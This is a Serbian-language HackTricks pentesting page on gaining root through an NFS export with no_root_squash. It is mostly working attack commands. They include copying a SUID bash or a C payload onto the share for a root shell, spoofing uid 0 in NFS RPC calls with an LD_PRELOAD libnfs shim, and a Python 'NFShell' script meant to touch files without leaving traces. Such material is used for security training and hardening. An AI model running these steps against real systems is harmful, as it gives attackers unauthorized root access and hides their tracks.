# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije o Squashing-u

NFS će obično (posebno na linux-u) verovati navedenim `uid` i `gid` vrednostima klijenta koji se povezuje radi pristupa fajlovima (ako se ne koristi kerberos). Međutim, na serveru se mogu podesiti određene konfiguracije koje **menjaju ovo ponašanje**:

- **`all_squash`**: Mapira sve pristupe tako što svakog korisnika i grupu pretvara u **`nobody`** (65534 unsigned / -2 signed). Dakle, svi su `nobody` i nijedan korisnik se ne koristi.
- **`root_squash`/`no_all_squash`**: Ovo je podrazumevano podešavanje na Linux-u i **squash-uje samo pristup sa uid 0 (root)**. Zato se svakom `UID` i `GID` veruje, ali se `0` mapira na `nobody` (tako da nije moguća root impersonacija).
- **``no_root_squash`**: Ako je ova konfiguracija omogućena, čak se ni root korisnik ne squash-uje. To znači da, ako montirate direktorijum sa ovom konfiguracijom, možete da mu pristupite kao root.

U fajlu **/etc/exports**, ako pronađete direktorijum koji je konfigurisan kao **no_root_squash**, možete mu **pristupiti** kao **klijent** i **upisivati u njega** kao da ste lokalni **root** na toj mašini.

Za više informacija o **NFS** proverite:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacija privilegija

### Remote Exploit

Opcija 1 sa korišćenjem bash-a:
- **Montiranje tog direktorijuma** na klijentskoj mašini, zatim **kopiranje kao root** binarnog fajla **/bin/bash** u montirani folder i dodeljivanje **SUID** prava, a potom **izvršavanje tog bash binarnog fajla sa mašine žrtve**.
- Imajte na umu da, da biste bili root unutar NFS share-a, na serveru mora biti konfigurisano **`no_root_squash`**.
- Međutim, ako nije omogućeno, možete eskalirati privilegije do drugog korisnika tako što ćete kopirati binarni fajl u NFS share i dodeliti mu SUID dozvolu kao korisnik do kog želite da eskalirate.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcija 2 koristeći C compilovani kod:
- **Montiranje tog direktorijuma** na klijentskoj mašini i **kopiranje kao root** našeg compilovanog payload-a unutar montiranog foldera, koji će zloupotrebiti SUID dozvolu, dodeliti mu **SUID** prava i **izvršiti taj binary sa** mašine žrtve (ovde možete pronaći neke [C SUID payload-e](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ista ograničenja kao i ranije
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Imajte na umu da, ako možete da kreirate **tunnel sa svoje mašine do victim mašine, i dalje možete koristiti Remote version za exploit ove privilege escalation situacije, prosleđivanjem potrebnih portova kroz tunnel**.\
> Sledeći trik je potreban u slučaju da fajl `/etc/exports` **navodi IP**. U tom slučaju **ni u kom slučaju nećete moći da koristite** **remote exploit** i moraćete da **zloupotrebite ovaj trik**.\
> Još jedan neophodan uslov za funkcionisanje exploita jeste da **export unutar `/etc/export`** **mora koristiti `insecure` flag**.\
> --_Nisam siguran da li će ovaj trik raditi ako `/etc/export` navodi IP adresu_--

### Osnovne informacije

Scenario podrazumeva exploitovanje montiranog NFS share-a na lokalnoj mašini, uz iskorišćavanje propusta u NFSv3 specifikaciji koji omogućava klijentu da navede svoj uid/gid, što potencijalno omogućava neovlašćeni pristup. Exploitation podrazumeva korišćenje biblioteke [libnfs](https://github.com/sahlberg/libnfs), koja omogućava falsifikovanje NFS RPC poziva.<sup>[[1]](#references)</sup>

#### Kompajliranje biblioteke

Koraci za kompajliranje biblioteke mogu zahtevati prilagođavanja u zavisnosti od verzije kernela. U ovom konkretnom slučaju, fallocate syscalls su zakomentarisani. Proces kompajliranja obuhvata sledeće komande:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Sprovođenje Exploit-a

Exploit podrazumeva kreiranje jednostavnog C programa (`pwn.c`) koji podiže privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultujući binarni fajl (`a.out`) postavlja se na share sa suid root, koristeći `ld_nfs.so` za lažiranje uid-a u RPC pozivima:

1. **Kompajlirajte exploit kod:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Postavite exploit na share i izmenite njegove dozvole lažiranjem uid-a:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Izvršite exploit da biste dobili root privilegije:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell za neupadljiv pristup fajlovima

Kada se dobije root access, za interakciju sa NFS share-om bez menjanja vlasništva (kako bi se izbeglo ostavljanje tragova), koristi se Python skripta (nfsh.py). Ova skripta prilagođava uid tako da odgovara uid-u fajla kojem se pristupa, čime omogućava interakciju sa fajlovima na share-u bez problema sa dozvolama:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Pokreni ovako:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Reference

- [1] [Priča o manje poznatom NFS privesc-u](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
